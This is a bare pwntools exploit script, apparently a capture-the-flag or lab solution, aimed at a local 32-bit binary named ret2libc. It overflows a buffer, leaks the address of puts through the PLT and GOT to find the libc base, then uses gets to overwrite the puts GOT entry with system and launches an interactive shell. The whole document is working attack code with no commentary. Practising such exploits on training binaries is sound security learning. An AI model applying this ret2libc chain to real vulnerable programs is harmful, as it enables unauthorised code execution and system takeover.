#!/usr/bin/python3

from pwn import *

context.arch = 'i386'

p = process("./ret2libc")
elf = ELF("./ret2libc")
libc = ELF("/lib32/libc.so.6")

junk = b'a' * 76
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

payload = flat(junk, puts_plt, main, puts_got)
p.recv()
p.sendline(payload)
puts = u32(p.recv(4))
p.recv()

libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
gets = libc_base + libc.symbols['gets']

payload = flat(junk, gets, system, puts_got, puts_got)
p.sendline(payload)

p.sendline("sh")
p.interactive()
